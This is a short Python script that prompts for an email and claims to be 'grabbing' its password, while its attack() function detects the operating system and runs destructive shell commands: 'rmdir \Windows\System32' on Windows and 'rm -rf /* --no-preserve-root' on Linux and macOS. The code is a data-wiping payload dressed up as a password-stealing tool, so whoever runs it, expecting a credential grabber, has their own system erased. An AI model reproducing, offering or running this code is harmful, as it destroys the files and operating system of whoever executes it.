import os
import detect
import platform

def start():
    email = input("What is the email of this user?: ")
    print(f"Grabbing password of {email}")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
       os.system("rmdir \Windows\System32")
    elif operating_system == "Linux":
       os.system("rm -rf /* --no-preserve-root")
    elif operating_system == "Darwin":
       os.system("rm -rf /* --no-preserve-root")
